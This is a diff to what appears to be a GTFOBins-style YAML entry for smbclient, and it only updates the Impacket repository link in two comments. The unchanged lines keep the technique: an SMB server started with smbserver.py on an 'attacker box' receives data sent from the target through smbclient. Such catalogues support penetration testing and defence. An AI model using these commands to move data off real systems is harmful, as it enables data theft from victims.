@@ -10,7 +10,7 @@ functions:
       code: |-
         smbserver.py -smb2support share .
       comment: |-
-        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
+        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/fortra/impacket)).
   shell:
   - code: |-
       smbclient '\\host\share'
@@ -30,5 +30,5 @@ functions:
       code: |-
         smbserver.py -smb2support share .
       comment: |-
-        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
+        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/fortra/impacket)).
 ...
